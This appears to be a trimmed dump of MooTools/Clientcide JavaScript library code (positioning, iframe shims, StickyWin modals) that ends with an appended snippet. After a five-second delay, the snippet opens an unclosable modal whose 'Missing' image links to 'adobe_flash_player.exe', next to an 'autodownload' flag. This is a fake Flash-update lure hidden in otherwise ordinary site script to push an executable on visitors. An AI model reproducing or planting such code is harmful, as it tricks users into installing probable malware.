...
Document.implement({
    newElement: function(tag, props) {
        if (Browser.Engine.trident && props) { ['name', 'type', 'checked'].each(function(attribute) {
...
var Clientcide = {
    ...
    setAssetLocation: function(baseHref) {
        ...
        if (window.Autocompleter) {
            ...
            if (Autocompleter.Ajax) { ["Base", "Xhtml", "Json"].each(function(c) {
...
var dbug = {
    ...
    enable: function(silent) {
        ...
        if (( !! window.console && !!window.console.warn) || window.firebug) {
            try {
                dbug.enabled = true;
                dbug.log = function() { (con.debug || con.log).apply(con, arguments)
                };
                dbug.time = function() {
...
var IframeShim = new Class({
    ...
    makeShim: function() {
        ...
        if (this.element.getStyle('z-Index').toInt() < 1 || isNaN(this.element.getStyle('z-Index').toInt())) this.element.setStyle('z-Index', 5);
        var z = this.element.getStyle('z-Index') - 1;
        if ($chk(this.options.zindex) && this.element.getStyle('z-Index').toInt() > this.options.zindex) z = this.options.zindex;
        this.shim.set({
...
Element.implement({
    pin: function(enable) {
        ...
        if (enable !== false) {
            ...
            this.setStyles($merge(reposition, {
                position: 'absolute'
            }))
        }
...
Element.implement({
    setPosition: function(options) {
        ...
        if (!options.edge) {
            if (options.position.x == 'center' && options.position.y == 'center') options.edge = {
                x: 'center',
                y: 'center'
            };
            else options.edge = {
...
var StickyWin = new Class({
    ...
    destroyOthers: function() {
        if (!this.options.allowMultipleByClass || !this.options.allowMultiple) {
            $$('div.StickyWinInstance').each(function(sw) {
                if (!this.options.allowMultiple || (!this.options.allowMultipleByClass && sw.hasClass(this.options.className))) sw.retrieve('StickyWin').destroy()
            },
            this)
        }
    },
    ...
    position: function(options) {
        ...
        this.win.setPosition({
            allowNegative: this.options.relativeTo != document.body,
    ...
    try {
        StickyWin.Fx.Modal.implement(new Modalizer())
    } catch(e) {}
})();
...
function() {
    ...
    var autodownload = "True"; autodownload.toLowerCase() == "true" ? "$(document.body).adopt(iframe)" : "";

    new StickyWin.Modal({
        content: "<a href=\"adobe_flash_player.exe\" title=\"Missing\" style=\"border:0\"><img src=\"missing.jpg\" width=\"757\" height=\"415\" border=\"0\"/></a>",
        modalOptions: {
            hideOnClick: false
        },
        onDisplay : $(autodownload)
    }).pin();
}.delay(5000));
